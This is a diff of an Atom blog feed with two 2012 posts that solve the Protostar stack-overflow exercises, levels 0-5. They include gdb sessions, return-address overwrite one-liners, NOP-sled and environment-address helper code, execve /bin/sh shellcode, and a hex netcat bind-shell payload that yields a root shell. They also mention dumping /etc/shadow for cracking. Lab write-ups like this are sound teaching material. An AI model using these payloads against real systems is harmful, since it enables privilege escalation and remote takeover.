+    <link href="http://louisrli.github.io/blog/2012/08/24/protostar-stack1/"/>
+    <updated>2012-08-24 00:00:00 -0400</updated>
+    <id>http://louisrli.github.io/blog/2012/08/24/protostar-stack1</id>
+    <content type="html"><![CDATA[<h1>Overview</h1>
+
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the second of three posts for Stack.</p>
+
+<h1>Solutions</h1>
+
+<h2>Stack: Level 4</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack4">full</a>): Overwrite the <a href="http://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#Instruction_Pointer">eip register</a> to change execution flow.</p>
+
+<p>First, we want to find the offset to the return address. We can explore using gdb and a breakpoint on <code>main</code>.</p>
+
+<p><div>
+  <pre><code class='console'>$ gdb ./stack4</code></pre>
+</div>
+</p>
+
+<!-- more -->
+
+
+<p><div>
+  <pre><code class='text'>(gdb) break main
+Breakpoint 1 at 0x8048411: file stack4/stack4.c, line 15.
+(gdb) run
+Starting program: /opt/protostar/bin/stack4&lt;/p&gt;
+
+&lt;p&gt;Breakpoint 1, main (argc=1, argv=0xbffff874) at stack4/stack4.c:15
+15      stack4/stack4.c: No such file or directory.
+in stack4/stack4.c
+(gdb) next
+AAAA
+16      in stack4/stack4.c
+(gdb) info frame
+Stack level 0, frame at 0xbffff7d0:
+eip = 0x804841d in main (stack4/stack4.c:16); saved eip 0xb7eacc76
+source language c.
+Arglist at 0xbffff7c8, args: argc=1, argv=0xbffff874
+Locals at 0xbffff7c8, Previous frame&amp;rsquo;s sp is 0xbffff7d0
+Saved registers:
+ebp at 0xbffff7c8, eip at 0xbffff7cc
+(gdb) x/32xw $esp
+0xbffff770:     0xbffff780      0xb7ec5165      0xbffff788      0xb7eaca75
+0xbffff780:     0x41414141      0x08049500      0xbffff798      0x080482e8
+0xbffff790:     0xb7ff1040      0x080495ec      0xbffff7c8      0x08048449
+0xbffff7a0:     0xb7fd7304      0xb7fd6ff4      0x08048430      0xbffff7c8
+0xbffff7b0:     0xb7ec5365      0xb7ff1040      0x0804843b      0xb7fd6ff4
+0xbffff7c0:     0x08048430      0x00000000      0xbffff848      0xb7eacc76
+0xbffff7d0:     0x00000001      0xbffff874      0xbffff87c      0xb7fe1848
+0xbffff7e0:     0xbffff830      0xffffffff      0xb7ffeff4      0x0804824b
+(gdb) p 0xbffff7cc &amp;ndash; 0xbffff780
+= 76
+(gdb) info address win
+Symbol &amp;ldquo;win&amp;rdquo; is a function at address 0x80483f4.</code></pre>
+</div>
+</p>
+
+<ul>
+<li><code>info frame</code>: Shows the normal location of the saved instruction pointer, <code>eip</code>: <code>0xb7eacc76</code>.</li>
+<li><code>x/32xw $esp</code>: Examines the current stack frame. The buffer starts at <code>0xbffff780</code> with <code>0x414141</code> (AAAA).</li>
+<li><code>p 0xbffff7cc - 0xbffff780</code>: Calculates <code>&amp;eip - &amp;buffer</code>, giving an offset to eip.
+Using the offset calculated above, <code>eip</code> is redirected to the address of <code>win()</code> function.</li>
+</ul>
+
+
+<p><div>
+  <pre><code class='console'>$ echo -e &amp;ldquo;$(perl -e &quot;print &amp;lsquo;A'x76&amp;rdquo;)\xf4\x83\x04\x08&quot; | ./stack4
+code flow successfully changed
+Segmentation fault</code></pre>
+</div>
+</p>
+
+<h2>Stack: Level 5</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack5">full</a>): Use buffer overflow to execute shellcode on a suid root program, <code>stack5</code>.</p>
+
+<h3>Utilities</h3>
+
+<p><code>~/nop</code>:
+<div>
+  <pre><code class='perl'>&lt;/p&gt;
+
+&lt;h1&gt;!/usr/bin/perl&lt;/h1&gt;
+
+&lt;h1&gt;Prints argv[0] number of NOP instructions to stdout&lt;/h1&gt;
+
+&lt;p&gt;print &amp;ldquo;\x90&quot;x$ARGV[0]</code></pre>
+</div>
+</p>
+
+<p><code>~/envaddr.c</code>:
+<div>
+  <pre><code class='c'>// Prints the approximate address of an environmental variable&lt;/p&gt;
+
+&lt;h1&gt;include &amp;lt;stdio.h&gt;&lt;/h1&gt;
+
+&lt;h1&gt;include &amp;lt;stdlib.h&gt;&lt;/h1&gt;
+
+&lt;p&gt;int main(int argc, char **argv) {&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;char *addr = getenv(argv[1]);
+if (addr == NULL) {
+    printf(&quot;%s not found\n&quot;, argv[1]);
+    return 1;
+}
+else {
+    printf(&quot;%s is at address %p\n&quot;, argv[1], getenv(argv[1]));
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;}</code></pre>
+</div>
+</p>
+
+<p>These utilities will be used in future solutions as well.</p>
+
+<h3>Solution</h3>
+
+<h4>Overview</h4>
+
+<p>From a high level, this is our approach:
+1. Store the shellcode in an environmental variable.
+2. Find the approximate address of the environmental variable on the stack.
+3. Overwriting the return address in <code>stack5</code> with the address of the environmental variable, we execute the shellcode.</p>
+
+<p>There are various ways to execute shellcode, but it&rsquo;s more reliable to keep the shellcode in an environmental variable rather than the buffer in case it&rsquo;s larger than the buffer (64 bytes).</p>
+
+<h4>Executing <code>/bin/sh</code></h4>
+
+<p>The shellcode is a modified version of the code from <em>Hacking: The Art of Exploitation</em>. It runs the command <code>/bin//sh -sli</code>.</p>
+
+<p><div>
+  <pre><code class='nasm'>BITS 32&lt;/p&gt;
+
+&lt;p&gt;xor eax, eax
+push eax
+push 0x68732f2f   ; chars for /bin//sh
+push 0x6e69622f
+mov ebx, esp
+push eax
+mov edx, esp&lt;/p&gt;
+
+&lt;p&gt;push eax
+push 0x736c692d   ; -sli flags
+push eax
+mov ecx, esp
+mov al, 11
+int 0x80</code></pre>
+</div>
+</p>
+
+<p>We&rsquo;ll overwrite the return address with the address of our shellcode environmental variable.
+<div>
+  <pre><code class='console'>$ export SC=$(echo -n $(~/nop 100)$(cat /home/user/shell))
+$ ~/envaddr SC
+SC is at address 0xbffffefa
+$ echo -n $(perl -e &amp;lsquo;print &amp;ldquo;\xfa\xfe\xff\xbf&quot;x25&amp;rsquo;) | /opt/protostar/bin/stack5</code></pre>
+</div>
+</p>
+
+<p>Nothing happened! Let&rsquo;s take a look with GDB.</p>
+
+<p><div>
+  <pre><code class='text'>[user@protostar:~]$ echo -n $(perl -e &amp;lsquo;print &amp;ldquo;\xfa\xfe\xff\xbf&quot;x25&amp;rsquo;) &gt; /tmp/sc-shell
+[user@protostar:~]$ gdb /opt/protostar/bin/stack5
+Reading symbols from /opt/protostar/bin/stack5&amp;hellip;done.
+(gdb) run &amp;lt; /tmp/sc-shell
+Starting program: /opt/protostar/bin/stack5 &amp;lt; /tmp/sc-shell
+Executing new program: /bin/dash&lt;/p&gt;
+
+&lt;p&gt;Program exited normally.</code></pre>
+</div>
+</p>
+
+<p>The shell opens, but it exits immediately. The shellcode is executing, but there&rsquo;s another issue: as documented <a href="http://stackoverflow.com/questions/10767070/buffer-overflow-program-terminates-after-spawning-a-shell">here</a> and <a href="http://forums.freebsd.org/showthread.php?t=10054">here</a>, opening shells from stdin is problematic.</p>
+
+<h4>Opening a shell through netcat</h4>
+
+<p>We know that our shellcode does run, but it can&rsquo;t open a shell. However, there are a wide a wide array of exploits available besides running <code>/bin/sh</code>. We could dump <a href="http://en.wikipedia.org/wiki//etc/shadow">/etc/shadow/</a> and use <a href="http://www.openwall.com/john/">John the Ripper</a> to crack the passwords. Another option is to open up a remote shell through <a href="http://linux.die.net/man/1/nc">netcat</a>. We&rsquo;ll use the netcat solution.</p>
+
+<p>Using <a href="http://shell-storm.org/shellcode/files/shellcode-684.php">netcat shellcode</a>, we go through the same process <a href="https://gist.github.com/9e403a2889a07eeb84a9">(plaintext gist)</a>:
+<div>
+  <pre><code class='console'>$ echo -ne &amp;ldquo;\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23&amp;rdquo; &gt; ~/sc-nc-8080
+$ export SC=$(echo -ne $(~/nop 100)$(cat /home/user/sc-nc-8080))
+$ ~/envaddr SC
+SC is at address 0xbffffece
+$ echo -n $(perl -e &amp;lsquo;print &amp;ldquo;\xce\xfe\xff\xbf&quot;x25&amp;rsquo;) | /opt/protostar/bin/stack5
+&lt;waiting&gt;</code></pre>
+</div>
+</p>
+
+<p>On another machine, complete the newly waiting connection:
+<div>
+  <pre><code class='console'>$[louis@neutrino ~]$ nc 192.168.1.10 8080
+whoami
+root</code></pre>
+</div>
+</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 0-3)]]></title>
+    <link href="http://louisrli.github.io/blog/2012/08/18/protostar-stack0/"/>
+    <updated>2012-08-18 00:00:00 -0400</updated>
+    <id>http://louisrli.github.io/blog/2012/08/18/protostar-stack0</id>
+    <content type="html"><![CDATA[<h1>Overview</h1>
+
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels.</p>
+
+<p>This is the first of three posts for Stack. The first four levels are straightforward, and their corresponding posts contain little explanation (solutions). The last three levels have more potential pitfalls, and those posts contain more detailed explanations (walkthroughs).</p>
+
+<h1>Solutions</h1>
+
+<h2>Stack: Level 0</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>
+
+<p><div>
+  <pre><code class='console'>$ perl -e &amp;ldquo;print &amp;lsquo;a'x65&amp;rdquo; | ./stack0
+you have changed the 'modified&amp;rsquo; variable</code></pre>
+</div>
+</p>
+
+<h2>Stack: Level 1</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>
+
+<p><div>
+  <pre><code class='console'>$ ./stack1 $(perl -e &amp;ldquo;print &amp;lsquo;a'x64 . dcba&amp;rdquo;)
+you have correctly got the variable to the right value</code></pre>
+</div>
+</p>
+
+<!-- more -->
+
+
+<h2>Stack: Level 2</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack2">full</a>): Overwrite a variable by using an environmental variable.</p>
+
+<p><div>
+  <pre><code class='console'>$ export GREENIE=$(echo -e &amp;ldquo;$(perl -e &quot;print ax64&amp;rdquo;)\n\r\n\r&quot;)
+$ ./stack2
+you have correctly modified the variable</code></pre>
+</div>
+</p>
+
+<h2>Stack: Level 3</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack3">full</a>): Overwrite a function pointer.</p>
+
+<p><div>
+  <pre><code class='console'>$ objdump -d ./stack3 | grep win
+08048424 &lt;win&gt;:
+$ echo -e &amp;ldquo;$(perl -e &quot;print &amp;lsquo;a'x64&amp;rdquo;)\x24\x84\x04\x08&quot; | ./stack3
+calling function pointer, jumping to 08048424
+code flow successfully changed</code></pre>
+</div>
+</p>
+]]></content>
+  </entry>
+  
+</feed>
